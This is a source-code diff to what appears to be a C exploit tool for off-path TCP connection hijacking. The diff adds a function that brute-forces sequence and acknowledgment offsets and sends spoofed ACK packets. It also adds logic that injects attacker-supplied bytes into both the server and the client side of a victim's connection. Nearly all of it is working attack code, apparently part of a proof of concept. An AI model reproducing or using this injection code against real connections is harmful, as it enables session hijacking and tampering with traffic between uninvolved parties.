@@ -1587,6 +1587,32 @@ int infer_ack_number(void)
 
 
 /*
+ * inject data into a connection by trying various offsets of the guessed
+ * seq/ack numbers
+ */
+int inject_data(volatile conn_t *pconn, char *buf, off_t len)
+{
+	int i, j;
+	uint32_t ack = pconn->ack;
+	uint32_t seq = pconn->seq;
+
+	for (i = -99; i < 100; i++) {
+		for (j = -99; j < 100; j++) {
+			pconn->seq = seq + i;
+			pconn->ack = ack + j;
+			if (!tcp_send(g_ctx.pch, pconn, TH_ACK, buf, len))
+				return 0;
+			usleep(g_ctx.packet_delay);
+		}
+	}
+
+	pconn->seq = seq;
+	pconn->ack = ack;
+	return 1;
+}
+
+
+/*
  * conduct the attack:
  * 1. synchronize with remote clock
  * 2. infer four-tuple
@@ -1639,12 +1665,52 @@ int conduct_offpath_attack(void)
 	if (!infer_sequence_number())
 		return 0;
 
+	/* if injection was requested, determine the seq/ack and do the deed */
 	if (g_ctx.inject_server || g_ctx.inject_client) {
+		u_long guess_start, guess_end;
+		u_long tmp;
+
 		/* figure out the target connection's ack value */
 		if (!infer_ack_number())
 			return 0;
 
-		// inject some stuff?
+		/* finish determining the sequence number */
+		tmp = g_ctx.spoof.ack;
+		g_ctx.spoof.ack -= g_ctx.winsz * 10;
+		guess_start = g_ctx.spoof.seq - g_ctx.winsz;
+		guess_end = g_ctx.spoof.seq + g_ctx.winsz;
+
+		if (!infer_sequence_step3(&guess_start, &guess_end, 1))
+			return 0;
+
+		g_ctx.spoof.ack = tmp;
+
+		/* inject data as requested */
+		if (g_ctx.inject_server) {
+			printf("[*] Injecting %lu bytes into the server!\n",
+					g_ctx.inject_server_len);
+
+			if (!inject_data(&(g_ctx.spoof), g_ctx.inject_server,
+						g_ctx.inject_server_len))
+				return 0;
+		}
+
+		if (g_ctx.inject_client) {
+			conn_t reversed;
+
+			/* swap the src/dst and seq/ack to send to the client */
+			reversed.src = g_ctx.spoof.dst;
+			reversed.dst = g_ctx.spoof.src;
+			reversed.seq = g_ctx.spoof.ack;
+			reversed.ack = g_ctx.spoof.seq;
+
+			printf("[*] Injecting %lu bytes into the client!\n",
+					g_ctx.inject_client_len);
+
+			if (!inject_data(&reversed, g_ctx.inject_client,
+						g_ctx.inject_client_len))
+				return 0;
+		}
 	}
 
 	gettimeofday(&attack_end, NULL);
